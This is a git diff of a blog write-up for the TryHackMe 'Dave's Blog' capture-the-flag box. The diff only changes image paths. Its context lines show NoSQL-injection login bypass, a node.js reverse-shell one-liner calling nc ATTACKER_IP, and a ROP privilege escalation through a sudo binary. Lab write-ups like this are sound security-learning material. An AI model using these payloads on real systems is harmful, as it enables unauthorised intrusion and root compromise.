@@ -49,33 +49,33 @@ There are four ports open:
 
 From the looks of it, the /admin directory on both web servers is disallowed in robots.txt. I fire up gobuster and ffuf to find subdirectories/subdomains in the background before starting full enumeration on ports 80 & 3000.
 
-![](../assets/img/2026-01-21-DavesBlog/1.png)
+![](/assets/img/2026-01-21-DavesBlog/1.png)
 
 The first landing page shows a barren site where Dave hosts his blog posts. He discloses that he built it with NoSQL which saves us time figuring that out. NoSQL is often prone to some pretty dangerous things like injection attacks to get passwords, including regex exploits.
 
-![](../assets/img/2026-01-21-DavesBlog/2.png)
+![](/assets/img/2026-01-21-DavesBlog/2.png)
 
 The /admin page holds a simple panel and a function to register, however that is disabled for now. We are also assigned a JWT cookie when landing on the page.
 
-![](../assets/img/2026-01-21-DavesBlog/3.png)
+![](/assets/img/2026-01-21-DavesBlog/3.png)
 
 Checking the 404 page confirms this is running node.js as well.
 
-![](../assets/img/2026-01-21-DavesBlog/4.png)
+![](/assets/img/2026-01-21-DavesBlog/4.png)
 
 The site on port 3000 is the exact same as our first one, so it's pretty obvious we must exploit NoSQL injection as the JWT decodes to just a type and alg header. Looking at the source code shows the logic behind the sign in, we must supply JSON data.
 
-![](../assets/img/2026-01-21-DavesBlog/5.png)
+![](/assets/img/2026-01-21-DavesBlog/5.png)
 
 After capturing a request to the login, I test injection for users admin and dave. Using the $ne operator set to null for the password works and we get a login. Decoding the JWT will give us the first flag and we can look around the site.
 
-![](../assets/img/2026-01-21-DavesBlog/6.png)
+![](/assets/img/2026-01-21-DavesBlog/6.png)
 
 The password field was just our flag which won't work on SSH, so I'll need to grab a shell by other means.
 
 The only thing we have access to internally is to some type of command prompt. I test for functionality with a simple equation of 2+2 and it returns. Supplying exec.exec shows undefined, meaning we're able to execute that function.
 
-![](../assets/img/2026-01-21-DavesBlog/7.png)
+![](/assets/img/2026-01-21-DavesBlog/7.png)
 
 ## Initital Foothold
 I try some shells thinking we can just run a node.js command using exec and child_process but it returns with {}. Just using require describes a function within.
@@ -99,22 +99,22 @@ I try a few more shells with the `require(child_process).exec()` method and find
 require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f')
 ```
 
-![](../assets/img/2026-01-21-DavesBlog/8.png)
+![](/assets/img/2026-01-21-DavesBlog/8.png)
 
 We can grab quickly grab the third flag by digging in the Mongo database.
 
-![](../assets/img/2026-01-21-DavesBlog/9.png)
+![](/assets/img/2026-01-21-DavesBlog/9.png)
 
 ## Privilege Escalation
 Listing Dave's sudo privileges shows that he can run a custom binary named `/uid_checker` as root. Using strings on it gives us the fourth flag and some more great info.
 
 When executing `/uid_checker`, it prompts us with an option of 1 or 2,  allowing us to choose between our UID or GID to display. There's a hidden function inside of it that conveniently contains `/bin/sh`. This is looking more and more vulnerable with every minute.
 
-![](../assets/img/2026-01-21-DavesBlog/10.png)
+![](/assets/img/2026-01-21-DavesBlog/10.png)
 
 I had trouble transfering it with wget so I copied the binary to into his blog and grabbed it with my browser. Inspecting the binary in depth shows a function named secret which makes a system call.
 
-![](../assets/img/2026-01-21-DavesBlog/11.png)
+![](/assets/img/2026-01-21-DavesBlog/11.png)
 
 This binary is prone to Return-oriented Programming (ROP). In short, our attack chain will consist of finding the pointer towards /bin/sh which we saw was available earlier. Then, we find a gadget to pop it off of the stack and into the RDI register. Finally calling the system function in order to execute it.
 
@@ -138,7 +138,7 @@ Here are some resources I found that helped me understand and exploit this:
 
 I use a tool called [ropstar](https://github.com/xct/ropstar) that automates this for us. Although I understand ROP at its core, this level of exploitation is above my paygrade and it'll save some time.
 
-![](../assets/img/2026-01-21-DavesBlog/12.png)
+![](/assets/img/2026-01-21-DavesBlog/12.png)
 
 The offset is 88 bytes and the tool finds all addresses to use. In short, it finds a gadget to use, gets our payload, and then calls to `system()` to execute it.
 
@@ -183,7 +183,7 @@ p.interactive()
 
 I finally run the script and get a successful logon and a root shell confirming the payload works as intended.
 
-![](../assets/img/2026-01-21-DavesBlog/13.png)
+![](/assets/img/2026-01-21-DavesBlog/13.png)
 
 Grabbing the final flag under root dir completes this box. Even though I love binary exploitation, this box was pretty difficult for me as getting into the nitty gritty machine code and debugging payloads can be a pain. Big thanks to [jammy](https://tryhackme.com/p/jammy) for creating this box and [xct](https://github.com/xct) for making things easy with ROPstar.
 
